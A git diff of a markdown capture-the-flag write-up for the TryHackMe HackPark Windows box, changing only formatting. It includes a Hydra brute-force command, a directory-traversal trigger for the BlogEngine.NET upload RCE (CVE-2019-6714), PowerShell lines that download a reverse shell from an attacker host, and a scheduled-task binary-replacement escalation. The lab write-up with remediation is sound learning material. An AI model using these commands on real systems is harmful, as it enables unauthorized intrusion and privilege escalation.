@@ -9,11 +9,11 @@
 
 ## Overview
 
-Compromise of the TryHackMe HackPark Windows Server 2012 R2 box by brute forcing the BlogEngine.NET admin login with Hydra (using fresh VIEWSTATE tokens captured via Burp Suite) to recover `admin:1qaz2wsx`, exploiting the authenticated `.ascx` file upload RCE in BlogEngine.NET 3.3.6.0 (CVE-2019-6714) via ExploitDB 46353.cs to land a shell as `IIS APPPOOL\Blog`, then escalating to `NT AUTHORITY\SYSTEM` by replacing `Message.exe` in the world-writable `C:\Program Files (x86)\SystemScheduler` directory so the scheduled task fires the payload as SYSTEM — completed both via Metasploit and manually with msfvenom, winPEAS, and netcat.
+Compromise of the TryHackMe HackPark Windows Server 2012 R2 box by brute forcing the BlogEngine.NET admin login with **Hydra** (using fresh VIEWSTATE tokens captured via Burp Suite) to recover **admin:1qaz2wsx**, exploiting the authenticated .ascx file upload RCE in BlogEngine.NET 3.3.6.0 (**CVE-2019-6714**) via ExploitDB 46353.cs to land a shell as IIS APPPOOL\Blog, then escalating to **NT AUTHORITY\SYSTEM** by replacing Message.exe in the world-writable C:\Program Files (x86)\SystemScheduler directory so the scheduled task fires the payload as SYSTEM. Completed both via Metasploit and manually with msfvenom, winPEAS, and netcat.
 
 ---
 
-**Target:** `10.66.179.121` (HACKPARK — Windows Server 2012 R2, 6.3 Build 9600)
+**Target:** **10.66.179.121** (HACKPARK, Windows Server 2012 R2, 6.3 Build 9600)
 
 ---
 
@@ -37,7 +37,7 @@ Browsing to port 80 reveals a BlogEngine.NET blog. The homepage displays a clown
 
 <img src="03-homepage-clown.png" width="800">
 
-The admin login page is located at `/Account/login.aspx`.
+The admin login page is located at /Account/login.aspx.
 
 <img src="04-login-page.png" width="800">
 
@@ -47,14 +47,14 @@ The admin login page is located at `/Account/login.aspx`.
 
 ### Brute Forcing the Login with Hydra
 
-The login form uses ASP.NET WebForms with `__VIEWSTATE` and `__EVENTVALIDATION` tokens embedded in each POST request. These tokens expire between requests which causes false positives when running Hydra at high thread counts. Burp Suite was used to capture a live POST request and extract valid tokens before running Hydra.
+The login form uses ASP.NET WebForms with __VIEWSTATE and __EVENTVALIDATION tokens embedded in each POST request. These tokens expire between requests which causes false positives when running Hydra at high thread counts. Burp Suite was used to capture a live POST request and extract valid tokens before running Hydra.
 
 ```bash
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.66.179.121 http-post-form \
 "/Account/login.aspx?ReturnURL=%2fadmin%2f:__VIEWSTATE=<token>&__EVENTVALIDATION=<token>&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed"
 ```
 
-**Credentials found:** `admin:1qaz2wsx`
+**Credentials found: admin:1qaz2wsx**
 
 > **Note:** ASP.NET VIEWSTATE tokens expire between requests. Running Hydra at high thread counts produces false positives because the server rejects requests with stale tokens regardless of the password. Using fresh tokens captured from Burp Suite resolved this. Burp Suite Intruder handles this scenario more reliably since it can fetch a new token per attempt.
 
@@ -62,13 +62,13 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.66.179.121 http-post-form 
 
 ### Admin Panel Access
 
-Logged into the BlogEngine.NET admin panel at `/admin`. The BlogEngine.NET version (3.3.6.0) was confirmed under the About section.
+Logged into the BlogEngine.NET admin panel at /admin. The BlogEngine.NET version (**3.3.6.0**) was confirmed under the About section.
 
 <img src="06-admin-panel.png" width="800">
 
 ### Remote Code Execution via CVE-2019-6714
 
-BlogEngine.NET 3.3.6.0 is vulnerable to an authenticated directory traversal and arbitrary file upload vulnerability. An authenticated user can upload a malicious `.ascx` file through the post editor file manager. Navigating to a crafted URL causes the web server to execute the uploaded file.
+BlogEngine.NET 3.3.6.0 is vulnerable to an authenticated directory traversal and arbitrary file upload vulnerability. An authenticated user can upload a malicious .ascx file through the post editor file manager. Navigating to a crafted URL causes the web server to execute the uploaded file.
 
 **Exploit:** ExploitDB 46353.cs
 
@@ -83,7 +83,7 @@ The file was edited to point to the attacker IP and listener port, then uploaded
 http://10.66.179.121/?theme=../../App_Data/files
 ```
 
-A reverse shell was caught as `IIS APPPOOL\Blog`.
+A reverse shell was caught as **IIS APPPOOL\Blog**.
 
 <img src="07-initial-shell.png" width="800">
 
@@ -101,7 +101,7 @@ powershell -c "Invoke-WebRequest http://<attacker_ip>:8000/shell.exe -OutFile C:
 
 ### Privilege Escalation via Scheduled Task
 
-Running `ps` in Meterpreter revealed `WScheduler.exe` spawning `Message.exe` from `C:\Program Files (x86)\SystemScheduler`. This directory was world-writable and `Message.exe` was being executed on a timer as SYSTEM.
+Running ps in Meterpreter revealed **WScheduler.exe** spawning **Message.exe** from C:\Program Files (x86)\SystemScheduler. This directory was world-writable and Message.exe was being executed on a timer as SYSTEM.
 
 A reverse shell payload was generated with the same name and used to replace the legitimate binary:
 
@@ -152,7 +152,7 @@ powershell -c "Invoke-WebRequest http://<attacker_ip>:8000/winPEAS.bat -OutFile 
 C:\Windows\Temp\winPEAS.bat
 ```
 
-winPEAS confirmed the same `WScheduler.exe` running `Message.exe` as SYSTEM and surfaced additional system information.
+winPEAS confirmed the same WScheduler.exe running Message.exe as SYSTEM and surfaced additional system information.
 
 **OS Version:** Windows 2012 R2 (6.3 Build 9600)  
 **Original Install Date:** 8/3/2019, 10:43:23 AM
@@ -173,11 +173,11 @@ The same Message.exe replacement technique was applied. A new payload was genera
 
 ### CVE-2019-6714 - BlogEngine.NET 3.3.6.0 Authenticated File Upload RCE
 
-BlogEngine.NET 3.3.6.0 allows authenticated users to upload files through the post editor file manager without properly validating file type or path. An attacker can upload a malicious `.ascx` web shell and trigger its execution via a directory traversal in the theme parameter, resulting in remote code execution under the context of the IIS application pool.
+BlogEngine.NET 3.3.6.0 allows authenticated users to upload files through the post editor file manager without properly validating file type or path. An attacker can upload a malicious .ascx web shell and trigger its execution via a directory traversal in the theme parameter, resulting in remote code execution under the context of the IIS application pool.
 
 ### Scheduled Task Binary Replacement - SystemScheduler
 
-The SystemScheduler service was configured to execute `Message.exe` from `C:\Program Files (x86)\SystemScheduler` on a recurring timer as SYSTEM. The directory was world-writable, allowing any user on the system to replace the binary with a malicious payload. When the scheduler fired, the payload executed with SYSTEM privileges.
+The SystemScheduler service was configured to execute Message.exe from C:\Program Files (x86)\SystemScheduler on a recurring timer as SYSTEM. The directory was world-writable, allowing any user on the system to replace the binary with a malicious payload. When the scheduler fired, the payload executed with SYSTEM privileges.
 
 **Remediation:** Restrict write permissions on service and scheduler binary directories to administrators only. Apply principle of least privilege to scheduled task execution accounts.
 
@@ -186,7 +186,7 @@ The SystemScheduler service was configured to execute `Message.exe` from `C:\Pro
 ## Key Takeaways
 
 - ASP.NET VIEWSTATE tokens complicate web brute forcing. Capturing fresh tokens from Burp Suite before running Hydra is necessary to avoid false positives
-- CVE-2019-6714 requires valid credentials, making brute force a prerequisite step rather than an optional one
+- **CVE-2019-6714** requires valid credentials, making brute force a prerequisite step rather than an optional one
 - Scheduled tasks running as SYSTEM that execute binaries from world-writable directories are a high severity misconfiguration. The attack requires no special tools once write access is confirmed
 - winPEAS reliably flags this class of vulnerability under running processes and scheduled task enumeration
 - The same attack chain works without Metasploit using only msfvenom, a Python HTTP server, PowerShell, and netcat
